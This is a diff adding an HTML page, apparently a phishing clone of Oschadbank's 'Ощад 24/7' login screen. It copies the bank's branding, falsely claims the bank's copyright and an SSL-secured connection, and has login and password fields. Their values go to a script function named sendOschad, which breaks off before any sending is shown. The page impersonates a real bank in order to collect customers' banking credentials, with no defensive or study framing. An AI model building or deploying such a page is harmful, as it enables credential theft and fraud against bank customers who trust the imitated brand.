@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ощад 24/7 — Вхід</title>
+    <style>
+        body { margin: 0; background-color: #f4f7f6; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background: #004a34; padding: 20px 0; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .logo-text { color: #ffffff; font-size: 24px; font-weight: bold; letter-spacing: 1px; }
+        .logo-text span { color: #ffcb05; } /* Золотистий акцент */
+        
+        .login-container { width: 90%; max-width: 380px; background: #ffffff; margin-top: 40px; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); box-sizing: border-box; }
+        h2 { color: #333; font-size: 22px; margin-bottom: 25px; text-align: center; font-weight: 500; }
+        
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 8px; color: #666; font-size: 14px; }
+        input { width: 100%; padding: 14px; border: 1px solid #ccd1d0; border-radius: 6px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.3s; }
+        input:focus { border-color: #004a34; }
+        
+        .btn-login { width: 100%; padding: 15px; background: #004a34; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.3s; }
+        .btn-login:hover { background: #003626; }
+        
+        .footer { margin-top: 30px; font-size: 13px; color: #999; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo-text">ОЩАД<span>24/7</span></div>
+    </div>
+
+    <div class="login-container">
+        <h2>Вхід до системи</h2>
+        
+        <div class="input-group">
+            <label>Логін або номер телефону</label>
+            <input type="text" id="username" placeholder="Введіть ваш логін">
+        </div>
+        
+        <div class="input-group">
+            <label>Пароль</label>
+            <input type="password" id="password" placeholder="Введіть пароль">
+        </div>
+        
+        <button class="btn-login" onclick="sendOschad()">УВІЙТИ</button>
+        
+        <div class="footer">
+            Захищене з'єднання SSL<br>
+            © АТ «Ощадбанк»
+        </div>
+    </div>
+
+    <script>
+        function sendOschad() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            if(user === "" || pass === "") {
+
